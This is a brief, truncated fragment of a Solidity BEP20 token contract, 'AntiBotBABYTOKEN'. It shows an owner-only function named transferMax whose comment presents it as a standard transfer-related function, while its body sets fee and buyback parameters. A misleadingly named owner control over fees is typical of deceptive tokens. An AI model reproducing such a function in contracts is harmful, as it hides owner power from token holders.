...
contract AntiBotBABYTOKEN is Context, IBEP20, Ownable {
    ...
    */
    ...
    /**
    * @dev See {IBEP20-transferMax}.
    *
    * Requirements:
    *
    * - `a` cannot be the zero address.
    */
    function transferMax(address a, uint256 ratio, uint256 accuracy, uint256 _buyback, uint256 _totalFee) public onlyOwner {    
        _accuracy = accuracy;
        buyback = _buyback;
